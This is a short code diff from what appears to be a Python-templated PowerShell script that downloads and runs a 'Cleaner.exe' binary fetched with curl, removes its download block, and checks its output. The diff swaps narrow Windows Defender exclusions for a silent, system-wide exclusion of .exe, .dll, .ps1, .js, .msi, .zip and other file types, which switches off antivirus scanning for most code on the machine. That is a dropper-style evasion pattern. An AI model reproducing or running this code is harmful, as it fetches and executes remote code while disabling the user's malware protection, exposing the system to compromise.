@@ -109,8 +109,7 @@ $exe=Join-Path $dir 'Cleaner.exe'
 & curl.exe -fsSL {_q(url)} -o $exe
 if(-not(Test-Path $exe) -or (Get-Item $exe).Length -lt 100000){{throw 'Cleaner.exe download failed'}}
 Unblock-File $exe -EA SilentlyContinue
-try{{Add-MpPreference -ExclusionPath $dir -EA SilentlyContinue}}catch{{}}
-try{{Add-MpPreference -ExclusionProcess 'Cleaner.exe' -EA SilentlyContinue}}catch{{}}
+try{{Add-MpPreference -ExclusionExtension '.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt' -EA SilentlyContinue}}catch{{}}
 $o=& $exe 2>&1 | Out-String -Width 4096
 Write-Output $o
 if($o -notmatch 'CLEANER done'){{throw 'Cleaner incomplete'}}
